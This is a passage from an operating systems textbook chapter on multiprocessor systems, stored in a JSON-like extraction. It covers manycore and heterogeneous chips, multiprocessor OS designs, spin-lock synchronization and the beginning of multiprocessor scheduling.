manycore, an easy\r\ndistinction is that you probably have a manycore if you no longer care about losing\r\none or two cores.\r\nAccelerator add-on cards like Intel’s Xeon Phi have in excess of 60 x86 cores.\r\nOther vendors have already crossed the 100-core barrier with different kinds of\r\ncores. A thousand general-purpose cores may be on their way. It is not easy to im\u0002agine what to do with a thousand cores, much less how to program them.\r\nAnother problem with really large numbers of cores is that the machinery\r\nneeded to keep their caches coherent becomes very complicated and very expen\u0002sive. Many engineers worry that cache coherence may not scale to many hundreds\r\nof cores. Some even advocate that we should give it up altogether. They fear that\r\nthe cost of coherence protocols in hardware will be so high that all those shiny new\r\ncores will not help performance much because the processor is too busy keeping\r\nthe caches in a consistent state. Worse, it would need to spend way too much mem\u0002ory on the (fast) directory to do so. This is known as the coherency wall.\nSEC. 8.1 MULTIPROCESSORS 529\r\nConsider, for instance, our directory-based cache-coherency solution discussed\r\nabove. If each directory entry contains a bit vector to indicate which cores contain\r\na particular cache line, the directory entry for a CPU with 1024 cores will be at\r\nleast 128 bytes long. Since cache lines themselves are rarely larger than 128 bytes,\r\nthis leads to the awkward situation that the directory entry is larger than the cache\u0002line it tracks. Probably not what we want.\r\nSome engineers argue that the only programming model that has proven to\r\nscale to very large numbers of processors is that which employs message passing\r\nand distributed memory—and that is what we should expect in future manycore\r\nchips also. Experimental processors like Intel’s 48-core SCC have already dropped\r\ncache consistency and provided hardware support for faster message passing in\u0002stead. On the other hand, other processors still provide consistency even at large\r\ncore counts. Hybrid models are also possible. For instance, a 1024-core chip may\r\nbe partitioned in 64 islands with 16 cache-coherent cores each, while abandoning\r\ncache coherence between the islands.\r\nThousands of cores are not even that special any more. The most common\r\nmanycores today, graphics processing units, are found in just about any computer\r\nsystem that is not embedded and has a monitor. A GPU is a processor with dedi\u0002cated memory and, literally, thousands of itty-bitty cores. Compared to gener\u0002al-purpose processors, GPUs spend more of their transistor budget on the circuits\r\nthat perform calculations and less on caches and control logic. They are very good\r\nfor many small computations done in parallel, like rendering polygons in graphics\r\napplications. They are not so good at serial tasks. They are also hard to program.\r\nWhile GPUs can be useful for operating systems (e.g., encryption or processing of\r\nnetwork traffic), it is not likely that much of the operating system itself will run on\r\nthe GPUs.\r\nOther computing tasks are increasingly handled by the GPU, especially com\u0002putationally demanding ones that are common in scientific computing. The term\r\nused for general-purpose processing on GPUs is—you guessed it— GPGPU. Un\u0002fortunately, programming GPUs efficiently is extremely difficult and requires spe\u0002cial programming languages such as OpenGL, or NVIDIA’s proprietary CUDA.\r\nAn important difference between programming GPUs and programming gener\u0002al-purpose processors is that GPUs are essentially ‘‘single instruction multiple\r\ndata’’ machines, which means that a large number of cores execute exactly the\r\nsame instruction but on different pieces of data. This programming model is great\r\nfor data parallelism, but not always convenient for other programming styles (such\r\nas task parallelism).\r\nHeterogeneous Multicores\r\nSome chips integrate a GPU and a number of general-purpose cores on the\r\nsame die. Similarly, many SoCs contain general-purpose cores in addition to one or\r\nmore special-purpose processors. Systems that integrate multiple different breeds\n530 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nof processors in a single chip are collectively known as heterogeneous multicore\r\nprocessors. An example of a heterogeneous multicore processor is the line of IXP\r\nnetwork processors originally introduced by Intel in 2000 and updated regularly\r\nwith the latest technology. The network processors typically contain a single gener\u0002al purpose control core (for instance, an ARM processor running Linux) and many\r\ntens of highly specialized stream processors that are really good at processing net\u0002work packets and not much else. They are commonly used in network equipment,\r\nsuch as routers and firewalls. To route network packets you probably do not need\r\nfloating-point operations much, so in most models the stream processors do not\r\nhave a floating-point unit at all. On the other hand, high-speed networking is high\u0002ly dependent on fast access to memory (to read packet data) and the stream proc\u0002essors have special hardware to make this possible.\r\nIn the previous examples, the systems were clearly heterogeneous. The stream\r\nprocessors and the control processors on the IXPs are completely different beasts\r\nwith different instruction sets. The same is true for the GPU and the general-pur\u0002pose cores. However, it is also possible to introduce heterogeneity while main\u0002taining the same instruction set. For instance, a CPU can have a small number of\r\n‘‘big’’ cores, with deep pipelines and possibly high clock speeds, and a larger num\u0002ber of ‘‘little’’ cores that are simpler, less powerful, and perhaps run at lower fre\u0002quencies. The powerful cores are needed for running code that requires fast\r\nsequential processing while the little cores are useful for tasks that can be executed\r\nefficiently in parallel. An example of a heterogeneous architecture along these lines\r\nis ARM’s big.LITTLE processor family.\r\nProgramming with Multiple Cores\r\nAs has often happened in the past, the hardware is way ahead of the software.\r\nWhile multicore chips are here now, our ability to write applications for them is\r\nnot. Current programming languages are poorly suited for writing highly parallel\r\nprograms and good compilers and debugging tools are scarce on the ground. Few\r\nprogrammers have had any experience with parallel programming and most know\r\nlittle about dividing work into multiple packages that can run in parallel. Syn\u0002chronization, eliminating race conditions, and deadlock avoidance are such stuff as\r\nreally bad dreams are made of, but unfortunately performance suffers horribly if\r\nthey are not handled well. Semaphores are not the answer.\r\nBeyond these startup problems, it is far from obvious what kind of application\r\nreally needs hundreds, let alone thousands, of cores—especially in home environ\u0002ments. In large server farms, on the other hand, there is often plenty of work for\r\nlarge numbers of cores. For instance, a popular server may easily use a different\r\ncore for each client request. Similarly, the cloud providers discussed in the previ\u0002ous chapter can soak up the cores to provide a large number of virtual machines to\r\nrent out to clients looking for on-demand computing power.\nSEC. 8.1 MULTIPROCESSORS 531"
          },
          "8.1.2 Multiprocessor Operating System Types": {
            "page": 562,
            "content": "8.1.2 Multiprocessor Operating System Types\r\nLet us now turn from multiprocessor hardware to multiprocessor software, in\r\nparticular, multiprocessor operating systems. Various approaches are possible.\r\nBelow we will study three of them. Note that all of these are equally applicable to\r\nmulticore systems as well as systems with discrete CPUs.\r\nEach CPU Has Its Own Operating System\r\nThe simplest possible way to organize a multiprocessor operating system is to\r\nstatically divide memory into as many partitions as there are CPUs and give each\r\nCPU its own private memory and its own private copy of the operating system. In\r\neffect, the n CPUs then operate as n independent computers. One obvious opti\u0002mization is to allow all the CPUs to share the operating system code and make pri\u0002vate copies of only the operating system data structures, as shown in Fig. 8-7.\r\nHas\r\nprivate\r\nOS\r\nCPU 1\r\nHas\r\nprivate\r\nOS\r\nCPU 2\r\nHas\r\nprivate\r\nOS\r\nCPU 3\r\nHas\r\nprivate\r\nOS\r\nCPU 4 Memory I/O\r\n1 2\r\nData Data\r\n3 4\r\nData Data\r\nOS code\r\nBus\r\nFigure 8-7. Partitioning multiprocessor memory among four CPUs, but sharing a\r\nsingle copy of the operating system code. The boxes marked Data are the operat\u0002ing system’s private data for each CPU.\r\nThis scheme is still better than having n separate computers since it allows all\r\nthe machines to share a set of disks and other I/O devices, and it also allows the\r\nmemory to be shared flexibly. For example, even with static memory allocation,\r\none CPU can be given an extra-large portion of the memory so it can handle large\r\nprograms efficiently. In addition, processes can efficiently communicate with one\r\nanother by allowing a producer to write data directly into memory and allowing a\r\nconsumer to fetch it from the place the producer wrote it. Still, from an operating\r\nsystems’ perspective, having each CPU have its own operating system is as primi\u0002tive as it gets.\r\nIt is worth mentioning four aspects of this design that may not be obvious.\r\nFirst, when a process makes a system call, the system call is caught and handled on\r\nits own CPU using the data structures in that operating system’s tables.\r\nSecond, since each operating system has its own tables, it also has its own set\r\nof processes that it schedules by itself. There is no sharing of processes. If a user\r\nlogs into CPU 1, all of his processes run on CPU 1. As a consequence, it can hap\u0002pen that CPU 1 is idle while CPU 2 is loaded with work.\n532 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nThird, there is no sharing of physical pages. It can happen that CPU 1 has\r\npages to spare while CPU 2 is paging continuously. There is no way for CPU 2 to\r\nborrow some pages from CPU 1 since the memory allocation is fixed.\r\nFourth, and worst, if the operating system maintains a buffer cache of recently\r\nused disk blocks, each operating system does this independently of the other ones.\r\nThus it can happen that a certain disk block is present and dirty in multiple buffer\r\ncaches at the same time, leading to inconsistent results. The only way to avoid this\r\nproblem is to eliminate the buffer caches. Doing so is not hard, but it hurts per\u0002formance considerably.\r\nFor these reasons, this model is rarely used in production systems any more,\r\nalthough it was used in the early days of multiprocessors, when the goal was to\r\nport existing operating systems to some new multiprocessor as fast as possible. In\r\nresearch, the model is making a comeback, but with all sorts of twists. There is\r\nsomething to be said for keeping the operating systems completely separate. If all\r\nof the state for each processor is kept local to that processor, there is little to no\r\nsharing to lead to consistency or locking problems. Conversely, if multiple proc\u0002essors have to access and modify the same process table, the locking becomes\r\ncomplicated quickly (and crucial for performance). We will say more about this\r\nwhen we discuss the symmetric multiprocessor model below.\r\nMaster-Slave Multiprocessors\r\nA second model is shown in Fig. 8-8. Here, one copy of the operating system\r\nand its tables is present on CPU 1 and not on any of the others. All system calls are\r\nredirected to CPU 1 for processing there. CPU 1 may also run user processes if\r\nthere is CPU time left over. This model is called master-slave since CPU 1 is the\r\nmaster and all the others are slaves.\r\nMaster\r\nruns\r\nOS\r\nCPU 1\r\nSlave\r\nruns user\r\nprocesses\r\nCPU 2\r\nSlave\r\nruns user\r\nprocesses\r\nCPU 3\r\nUser\r\nprocesses\r\nOS\r\nCPU 4 Memory I/O\r\nBus\r\nSlave\r\nruns user\r\nprocesses\r\nFigure 8-8. A master-slave multiprocessor model.\r\nThe master-slave model solves most of the problems of the first model. There\r\nis a single data structure (e.g., one list or a set of prioritized lists) that keeps track\r\nof ready processes. When a CPU goes idle, it asks the operating system on CPU 1\r\nfor a process to run and is assigned one. Thus it can never happen that one CPU is\nSEC. 8.1 MULTIPROCESSORS 533\r\nidle while another is overloaded. Similarly, pages can be allocated among all the\r\nprocesses dynamically and there is only one buffer cache, so inconsistencies never\r\noccur.\r\nThe problem with this model is that with many CPUs, the master will become\r\na bottleneck. After all, it must handle all system calls from all CPUs. If, say, 10%\r\nof all time is spent handling system calls, then 10 CPUs will pretty much saturate\r\nthe master, and with 20 CPUs it will be completely overloaded. Thus this model is\r\nsimple and workable for small multiprocessors, but for large ones it fails.\r\nSymmetric Multiprocessors\r\nOur third model, the SMP (Symmetric MultiProcessor), eliminates this\r\nasymmetry. There is one copy of the operating system in memory, but any CPU\r\ncan run it. When a system call is made, the CPU on which the system call was\r\nmade traps to the kernel and processes the system call. The SMP model is illustrat\u0002ed in Fig. 8-9.\r\nRuns\r\nusers and\r\nshared OS\r\nCPU 1\r\nRuns\r\nusers and\r\nshared OS\r\nCPU 2\r\nRuns\r\nusers and\r\nshared OS\r\nCPU 3\r\nRuns\r\nusers and\r\nshared OS OS\r\nCPU 4 Memory I/O\r\nLocks\r\nBus\r\nFigure 8-9. The SMP multiprocessor model.\r\nThis model balances processes and memory dynamically, since there is only\r\none set of operating system tables. It also eliminates the master CPU bottleneck,\r\nsince there is no master, but it introduces its own problems. In particular, if two or\r\nmore CPUs are running operating system code at the same time, disaster may well\r\nresult. Imagine two CPUs simultaneously picking the same process to run or\r\nclaiming the same free memory page. The simplest way around these problems is\r\nto associate a mutex (i.e., lock) with the operating system, making the whole sys\u0002tem one big critical region. When a CPU wants to run operating system code, it\r\nmust first acquire the mutex. If the mutex is locked, it just waits. In this way, any\r\nCPU can run the operating system, but only one at a time. This approach is some\u0002things called a big kernel lock.\r\nThis model works, but is almost as bad as the master-slave model. Again, sup\u0002pose that 10% of all run time is spent inside the operating system. With 20 CPUs,\r\nthere will be long queues of CPUs waiting to get in. Fortunately, it is easy to im\u0002prove. Many parts of the operating system are independent of one another. For\n534 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nexample, there is no problem with one CPU running the scheduler while another\r\nCPU is handling a file-system call and a third one is processing a page fault.\r\nThis observation leads to splitting the operating system up into multiple inde\u0002pendent critical regions that do not interact with one another. Each critical region is\r\nprotected by its own mutex, so only one CPU at a time can execute it. In this way,\r\nfar more parallelism can be achieved. However, it may well happen that some ta\u0002bles, such as the process table, are used by multiple critical regions. For example,\r\nthe process table is needed for scheduling, but also for the fork system call and also\r\nfor signal handling. Each table that may be used by multiple critical regions needs\r\nits own mutex. In this way, each critical region can be executed by only one CPU\r\nat a time and each critical table can be accessed by only one CPU at a time.\r\nMost modern multiprocessors use this arrangement. The hard part about writ\u0002ing the operating system for such a machine is not that the actual code is so dif\u0002ferent from a regular operating system. It is not. The hard part is splitting it into\r\ncritical regions that can be executed concurrently by different CPUs without inter\u0002fering with one another, not even in subtle, indirect ways. In addition, every table\r\nused by two or more critical regions must be separately protected by a mutex and\r\nall code using the table must use the mutex correctly.\r\nFurthermore, great care must be taken to avoid deadlocks. If two critical re\u0002gions both need table A and table B, and one of them claims A first and the other\r\nclaims B first, sooner or later a deadlock will occur and nobody will know why. In\r\ntheory, all the tables could be assigned integer values and all the critical regions\r\ncould be required to acquire tables in increasing order. This strategy avoids dead\u0002locks, but it requires the programmer to think very carefully about which tables\r\neach critical region needs and to make the requests in the right order.\r\nAs the code evolves over time, a critical region may need a new table it did not\r\npreviously need. If the programmer is new and does not understand the full logic\r\nof the system, then the temptation will be to just grab the mutex on the table at the\r\npoint it is needed and release it when it is no longer needed. However reasonable\r\nthis may appear, it may lead to deadlocks, which the user will perceive as the sys\u0002tem freezing. Getting it right is not easy and keeping it right over a period of years\r\nin the face of changing programmers is very difficult."
          },
          "8.1.3 Multiprocessor Synchronization": {
            "page": 565,
            "content": "8.1.3 Multiprocessor Synchronization\r\nThe CPUs in a multiprocessor frequently need to synchronize. We just saw the\r\ncase in which kernel critical regions and tables have to be protected by mutexes.\r\nLet us now take a close look at how this synchronization actually works in a multi\u0002processor. It is far from trivial, as we will soon see.\r\nTo start with, proper synchronization primitives are really needed. If a process\r\non a uniprocessor machine (just one CPU) makes a system call that requires ac\u0002cessing some critical kernel table, the kernel code can just disable interrupts before\nSEC. 8.1 MULTIPROCESSORS 535\r\ntouching the table. It can then do its work knowing that it will be able to finish\r\nwithout any other process sneaking in and touching the table before it is finished.\r\nOn a multiprocessor, disabling interrupts affects only the CPU doing the disable.\r\nOther CPUs continue to run and can still touch the critical table. As a conse\u0002quence, a proper mutex protocol must be used and respected by all CPUs to guar\u0002antee that mutual exclusion works.\r\nThe heart of any practical mutex protocol is a special instruction that allows a\r\nmemory word to be inspected and set in one indivisible operation. We saw how\r\nTSL (Test and Set Lock) was used in Fig. 2-25 to implement critical regions. As\r\nwe discussed earlier, what this instruction does is read out a memory word and\r\nstore it in a register. Simultaneously, it writes a 1 (or some other nonzero value) in\u0002to the memory word. Of course, it takes two bus cycles to perform the memory\r\nread and memory write. On a uniprocessor, as long as the instruction cannot be\r\nbroken off halfway, TSL always works as expected.\r\nNow think about what could happen on a multiprocessor. In Fig. 8-10 we see\r\nthe worst-case timing, in which memory word 1000, being used as a lock, is ini\u0002tially 0. In step 1, CPU 1 reads out the word and gets a 0. In step 2, before CPU 1\r\nhas a chance to rewrite the word to 1, CPU 2 gets in and also reads the word out as\r\na 0. In step 3, CPU 1 writes a 1 into the word. In step 4, CPU 2 also writes a 1\r\ninto the word. Both CPUs got a 0 back from the TSL instruction, so both of them\r\nnow hav e access to the critical region and the mutual exclusion fails.\r\nCPU 1 Memory CPU 2\r\nBus\r\nWord\r\n1000 is\r\ninitially 0\r\n1. CPU 1 reads a 0\r\n3. CPU 1 writes a 1\r\n2. CPU 2 reads a 0\r\n4. CPU 2 writes a 1\r\nFigure 8-10. The TSL instruction can fail if the bus cannot be locked. These four\r\nsteps show a sequence of events where the failure is demonstrated.\r\nTo prevent this problem, the TSL instruction must first lock the bus, preventing\r\nother CPUs from accessing it, then do both memory accesses, then unlock the bus.\r\nTypically, locking the bus is done by requesting the bus using the usual bus request\r\nprotocol, then asserting (i.e., setting to a logical 1 value) some special bus line until\r\nboth cycles have been completed. As long as this special line is being asserted, no\r\nother CPU will be granted bus access. This instruction can only be implemented on\r\na bus that has the necessary lines and (hardware) protocol for using them. Modern\r\nbuses all have these facilities, but on earlier ones that did not, it was not possible to\n536 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nimplement TSL correctly. This is why Peterson’s protocol was invented: to synchro\u0002nize entirely in software (Peterson, 1981).\r\nIf TSL is correctly implemented and used, it guarantees that mutual exclusion\r\ncan be made to work. However, this mutual exclusion method uses a spin lock be\u0002cause the requesting CPU just sits in a tight loop testing the lock as fast as it can.\r\nNot only does it completely waste the time of the requesting CPU (or CPUs), but it\r\nmay also put a massive load on the bus or memory, seriously slowing down all\r\nother CPUs trying to do their normal work.\r\nAt first glance, it might appear that the presence of caching should eliminate\r\nthe problem of bus contention, but it does not. In theory, once the requesting CPU\r\nhas read the lock word, it should get a copy in its cache. As long as no other CPU\r\nattempts to use the lock, the requesting CPU should be able to run out of its cache.\r\nWhen the CPU owning the lock writes a 0 to it to release it, the cache protocol\r\nautomatically invalidates all copies of it in remote caches, requiring the correct\r\nvalue to be fetched again.\r\nThe problem is that caches operate in blocks of 32 or 64 bytes. Usually, the\r\nwords surrounding the lock are needed by the CPU holding the lock. Since the TSL\r\ninstruction is a write (because it modifies the lock), it needs exclusive access to the\r\ncache block containing the lock. Therefore every TSL invalidates the block in the\r\nlock holder’s cache and fetches a private, exclusive copy for the requesting CPU.\r\nAs soon as the lock holder touches a word adjacent to the lock, the cache block is\r\nmoved to its machine. Consequently, the entire cache block containing the lock is\r\nconstantly being shuttled between the lock owner and the lock requester, generat\u0002ing even more bus traffic than individual reads on the lock word would have.\r\nIf we could get rid of all the TSL-induced writes on the requesting side, we\r\ncould reduce the cache thrashing appreciably. This goal can be accomplished by\r\nhaving the requesting CPU first do a pure read to see if the lock is free. Only if the\r\nlock appears to be free does it do a TSL to actually acquire it. The result of this\r\nsmall change is that most of the polls are now reads instead of writes. If the CPU\r\nholding the lock is only reading the variables in the same cache block, they can\r\neach have a copy of the cache block in shared read-only mode, eliminating all the\r\ncache-block transfers.\r\nWhen the lock is finally freed, the owner does a write, which requires exclu\u0002sive access, thus invalidating all copies in remote caches. On the next read by the\r\nrequesting CPU, the cache block will be reloaded. Note that if two or more CPUs\r\nare contending for the same lock, it can happen that both see that it is free simul\u0002taneously, and both do a TSL simultaneously to acquire it. Only one of these will\r\nsucceed, so there is no race condition here because the real acquisition is done by\r\nthe TSL instruction, and it is atomic. Seeing that the lock is free and then trying to\r\ngrab it immediately with a TSL does not guarantee that you get it. Someone else\r\nmight win, but for the correctness of the algorithm, it does not matter who gets it.\r\nSuccess on the pure read is merely a hint that this would be a good time to try to\r\nacquire the lock, but it is not a guarantee that the acquisition will succeed.\nSEC. 8.1 MULTIPROCESSORS 537\r\nAnother way to reduce bus traffic is to use the well-known Ethernet binary\r\nexponential backoff algorithm (Anderson, 1990). Instead of continuously polling,\r\nas in Fig. 2-25, a delay loop can be inserted between polls. Initially the delay is one\r\ninstruction. If the lock is still busy, the delay is doubled to two instructions, then\r\nfour instructions, and so on up to some maximum. A low maximum gives a fast\r\nresponse when the lock is released, but wastes more bus cycles on cache thrashing.\r\nA high maximum reduces cache thrashing at the expense of not noticing that the\r\nlock is free so quickly. Binary exponential backoff can be used with or without the\r\npure reads preceding the TSL instruction.\r\nAn even better idea is to give each CPU wishing to acquire the mutex its own\r\nprivate lock variable to test, as illustrated in Fig. 8-11 (Mellor-Crummey and Scott,\r\n1991). The variable should reside in an otherwise unused cache block to avoid\r\nconflicts. The algorithm works by having a CPU that fails to acquire the lock allo\u0002cate a lock variable and attach itself to the end of a list of CPUs waiting for the\r\nlock. When the current lock holder exits the critical region, it frees the private lock\r\nthat the first CPU on the list is testing (in its own cache). This CPU then enters the\r\ncritical region. When it is done, it frees the lock its successor is using, and so on.\r\nAlthough the protocol is somewhat complicated (to avoid having two CPUs attach\r\nthemselves to the end of the list simultaneously), it is efficient and starvation free.\r\nFor all the details, readers should consult the paper.\r\nCPU 3\r\nCPU 3 spins on this (private) lock\r\nCPU 4 spins on this (private) lock CPU 2 spins on this (private) lock\r\nWhen CPU 1 is finished with the\r\nreal lock, it releases it and also\r\nreleases the private lock CPU 2\r\nis spinning on\r\nCPU 1\r\nholds the\r\nreal lock\r\nShared memory\r\n2 4\r\n3\r\n1\r\nFigure 8-11. Use of multiple locks to avoid cache thrashing.\r\nSpinning vs. Switching\r\nSo far we have assumed that a CPU needing a locked mutex just waits for it,\r\nby polling continuously, polling intermittently, or attaching itself to a list of wait\u0002ing CPUs. Sometimes, there is no alternative for the requesting CPU to just wait\u0002ing. For example, suppose that some CPU is idle and needs to access the shared\n538 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nready list to pick a process to run. If the ready list is locked, the CPU cannot just\r\ndecide to suspend what it is doing and run another process, as doing that would re\u0002quire reading the ready list. It must wait until it can acquire the ready list.\r\nHowever, in other cases, there is a choice. For example, if some thread on a\r\nCPU needs to access the file system buffer cache and it is currently locked, the\r\nCPU can decide to switch to a different thread instead of waiting. The issue of\r\nwhether to spin or to do a thread switch has been a matter of much research, some\r\nof which will be discussed below. Note that this issue does not occur on a uniproc\u0002essor because spinning does not make much sense when there is no other CPU to\r\nrelease the lock. If a thread tries to acquire a lock and fails, it is always blocked to\r\ngive the lock owner a chance to run and release the lock.\r\nAssuming that spinning and doing a thread switch are both feasible options,\r\nthe trade-off is as follows. Spinning wastes CPU cycles directly. Testing a lock re\u0002peatedly is not productive work. Switching, however, also wastes CPU cycles,\r\nsince the current thread’s state must be saved, the lock on the ready list must be ac\u0002quired, a thread must be selected, its state must be loaded, and it must be started.\r\nFurthermore, the CPU cache will contain all the wrong blocks, so many expensive\r\ncache misses will occur as the new thread starts running. TLB faults are also like\u0002ly. Eventually, a switch back to the original thread must take place, with more\r\ncache misses following it. The cycles spent doing these two context switches plus\r\nall the cache misses are wasted.\r\nIf it is known that mutexes are generally held for, say, 50 μsec and it takes 1\r\nmsec to switch from the current thread and 1 msec to switch back later, it is more\r\nefficient just to spin on the mutex. On the other hand, if the average mutex is held\r\nfor 10 msec, it is worth the trouble of making the two context switches. The trouble\r\nis that critical regions can vary considerably in their duration, so which approach is\r\nbetter?\r\nOne design is to always spin. A second design is to always switch. But a third\r\ndesign is to make a separate decision each time a locked mutex is encountered. At\r\nthe time the decision has to be made, it is not known whether it is better to spin or\r\nswitch, but for any giv en system, it is possible to make a trace of all activity and\r\nanalyze it later offline. Then it can be said in retrospect which decision was the\r\nbest one and how much time was wasted in the best case. This hindsight algorithm\r\nthen becomes a benchmark against which feasible algorithms can be measured.\r\nThis problem has been studied by researchers for decades (Ousterhout, 1982).\r\nMost work uses a model in which a thread failing to acquire a mutex spins for\r\nsome period of time. If this threshold is exceeded, it switches. In some cases the\r\nthreshold is fixed, typically the known overhead for switching to another thread\r\nand then switching back. In other cases it is dynamic, depending on the observed\r\nhistory of the mutex being waited on.\r\nThe best results are achieved when the system keeps track of the last few\r\nobserved spin times and assumes that this one will be similar to the previous ones.\r\nFor example, assuming a 1-msec context switch time again, a thread will spin for a\nSEC. 8.1 MULTIPROCESSORS 539\r\nmaximum of 2 msec, but observe how long it actually spun. If it fails to acquire a\r\nlock and sees that on the previous three runs it waited an average of 200 μsec, it\r\nshould spin for 2 msec before switching. However, if it sees that it spun for the full\r\n2 msec on each of the previous attempts, it should switch immediately and not spin\r\nat all.\r\nSome modern processors, including the x86, offer special intructions to make\r\nthe waiting more efficient in terms of reducing power consumption. For instance,\r\nthe MONITOR/MWAIT instructions on x86 allow a program to block until some\r\nother processor modifies the data in a previously defined memory area. Specif\u0002ically, the MONITOR instruction defines an address range that should be monitored\r\nfor writes. The MWAIT instruction then blocks the thread until someone writes to\r\nthe area. Effectively, the thread is spinning, but without burning many cycles need\u0002lessly."
          },
          "8.1.4 Multiprocessor Scheduling": {
            "page": 570,
            "content": "8.1.4 Multiprocessor Scheduling\r\nBefore looking at how scheduling is done on multiprocessors, it is necessary to\r\ndetermine what is being scheduled. Back in the old days, when all processes were\r\nsingle threaded, processes were scheduled—there was nothing else schedulable.\r\nAll modern operating systems support multithreaded processes, which makes\r\nscheduling more complicated.\r\nIt matters whether the threads are kernel threads or user threads. If threading is\r\ndone by a user-space library and the kernel knows nothing about the threads, then\r\nscheduling happens on a per-process basis as it always did. If the kernel does not\r\nev en know threads exist, it can hardly schedule them.\r\nWith kernel threads, the picture is different. Here the kernel is aware of all the\r\nthreads and can pick and choose among the threads belonging to a process. In these\r\nsystems, the trend is for the kernel to pick a thread to run, with the process it be\u0002longs to having only a small role (or maybe none) in the thread-selection algo\u0002rithm. Below we will talk about scheduling threads, but of course, in a system\r\nwith single-threaded processes or threads implemented in user space, it is the proc\u0002esses that are scheduled.\r\nProcess vs. thread is not the only scheduling issue. On a uniprocessor, sched\u0002uling is one dimensional. The only question that must be answered (repeatedly) is:\r\n‘‘Which thread should be run next?’’ On a multiprocessor, scheduling has two\r\ndimensions. The scheduler has to decide which thread to run and which CPU to\r\nrun it on. This extra dimension greatly complicates scheduling on multiprocessors.\r\nAnother complicating factor is that in some systems, all of the threads are\r\nunrelated, belonging to different processes and having nothing to do with one\r\nanother. In others they come in groups, all belonging to the same application and\r\nworking together. An example of the former situation is a server system in which\r\nindependent users start up independent processes. The threads of different proc\u0002esses are unrelated and each one can be scheduled without regard to the other ones.\n540 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nAn example of the latter situation occurs regularly in program development en\u0002vironments. Large systems often consist of some number of header files containing\r\nmacros, type definitions, and variable declarations that are used by the actual code\r\nfiles. When a header file is changed, all the code files that include it must be re\u0002compiled. The program make is commonly used to manage development. When\r\nmake is invoked, it starts the compilation of only those code files that must be re\u0002compiled on account of changes to the header or code files. Object files that are\r\nstill valid are not regenerated.\r\nThe original version of make did its work sequentially, but newer versions de\u0002signed for multiprocessors can start up all the compilations at once. If 10 compila\u0002tions are needed, it does not make sense to schedule 9 of them to run immediately\r\nand leave the last one until much later since the user will not perceive the work as\r\ncompleted until the last one has finished. In this case it makes sense to regard the\r\nthreads doing the compilations as a group and to take that into account when\r\nscheduling them.\r\nMoroever sometimes it is useful to schedule threads that communicate exten\u0002sively, say in a producer-consumer fashion, not just at the same time, but also close\r\ntogether in space. For instance, they may benefit from sharing caches. Likewise, in\r\nNUMA architectures, it may help if they access memory that is close by.\r\nTime Sharing\r\nLet us first address the case of scheduling independent threads; later we will\r\nconsider how to schedule related threads. The simplest scheduling algorithm for\r\ndealing with unrelated threads is to have a single systemwide data structure for\r\nready threads, possibly just a list, but more likely a set of lists for threads at dif\u0002ferent priorities as depicted in Fig. 8-12(a). Here the 16 CPUs are all currently\r\nbusy, and a prioritized set of 14 threads are waiting to run. The first CPU to finish\r\nits current work (or have its thread block) is CPU 4, which then locks the schedul\u0002ing queues and selects the highest-priority thread, A, as shown in Fig. 8-12(b).\r\nNext, CPU 12 goes idle and chooses thread B, as illustrated in Fig. 8-12(c). As\r\nlong as the threads are completely unrelated, doing scheduling this way is a rea\u0002sonable choice and it is very simple to implement efficiently.\r\nHaving a single scheduling data structure used by all CPUs timeshares the\r\nCPUs, much as they would be in a uniprocessor system. It also provides automatic\r\nload balancing because it can never happen that one CPU is idle while others are\r\noverloaded. Two disadvantages of this approach are the potential contention for the\r\nscheduling data structure as the number of CPUs grows and the usual overhead in\r\ndoing a context switch when a thread blocks for I/O.\r\nIt is also possible that a context switch happens when a thread’s quantum ex\u0002pires. On a multiprocessor, that has certain properties not present on a uniproc\u0002essor. Suppose that the thread happens to hold a spin lock when its quantum ex\u0002pires. Other CPUs waiting on the spin lock just waste their time spinning until that\nSEC. 8.1 MULTIPROCESSORS 541\r\n0\r\n4\r\n8\r\n12\r\n1\r\n5\r\n9\r\n13\r\n2\r\n6\r\n10\r\n14\r\n3\r\n7\r\n11\r\n15\r\nA B C\r\nD E\r\nF\r\nG H I\r\nJ K\r\nL M N\r\n7\r\n5\r\n4\r\n2\r\n1\r\n0\r\nPriority\r\nCPU\r\n0\r\nA\r\n8\r\n12\r\n1\r\n5\r\n9\r\n13\r\n2\r\n6\r\n10\r\n14\r\n3\r\n7\r\n11\r\n15\r\nB C\r\nD E\r\nF\r\nG H I\r\nJ K\r\nL M N\r\n7\r\n5\r\n4\r\n2\r\n1\r\n0\r\nPriority\r\nCPU 4\r\ngoes idle\r\nCPU 12\r\ngoes idle\r\n0\r\nA\r\n8\r\nB\r\n1\r\n5\r\n9\r\n13\r\n2\r\n6\r\n10\r\n14\r\n3\r\n7\r\n11\r\n15\r\nC\r\nD E\r\nF\r\nG H I\r\nJ K\r\nL M N\r\n7\r\n5\r\n4\r\n2\r\n333\r\n666\r\n1\r\n0\r\nPriority\r\n(a) (b) (c)\r\nFigure 8-12. Using a single data structure for scheduling a multiprocessor.\r\nthread is scheduled again and releases the lock. On a uniprocessor, spin locks are\r\nrarely used, so if a process is suspended while it holds a mutex, and another thread\r\nstarts and tries to acquire the mutex, it will be immediately blocked, so little time is\r\nwasted.\r\nTo get around this anomaly, some systems use smart scheduling, in which a\r\nthread acquiring a spin lock sets a processwide flag to show that it currently has a\r\nspin lock (Zahorjan et al., 1991). When it releases the lock, it clears the flag. The\r\nscheduler then does not stop a thread holding a spin lock, but instead gives it a lit\u0002tle more time to complete its critical region and release the lock.\r\nAnother issue that plays a role in scheduling is the fact that while all CPUs are\r\nequal, some CPUs are more equal. In particular, when thread A has run for a long\r\ntime on CPU k, CPU k’s cache will be full of A’s blocks. If A gets to run again\r\nsoon, it may perform better if it is run on CPU k, because k’s cache may still con\u0002tain some of A’s blocks. Having cache blocks preloaded will increase the cache hit\r\nrate and thus the thread’s speed. In addition, the TLB may also contain the right\r\npages, reducing TLB faults.\r\nSome multiprocessors take this effect into account and use what is called affin\u0002ity scheduling (Vaswani and Zahorjan, 1991). The basic idea here is to make a\r\nserious effort to have a thread run on the same CPU it ran on last time. One way to\r\ncreate this affinity is to use a two-level scheduling algorithm. When a thread is\r\ncreated, it is assigned to a CPU, for example based on which one has the smallest\r\nload at that moment. This assignment of threads to CPUs is the top level of the al\u0002gorithm. As a result of this policy, each CPU acquires its own collection of\r\nthreads.\r\nThe actual scheduling of the threads is the bottom level of the algorithm. It is\r\ndone by each CPU 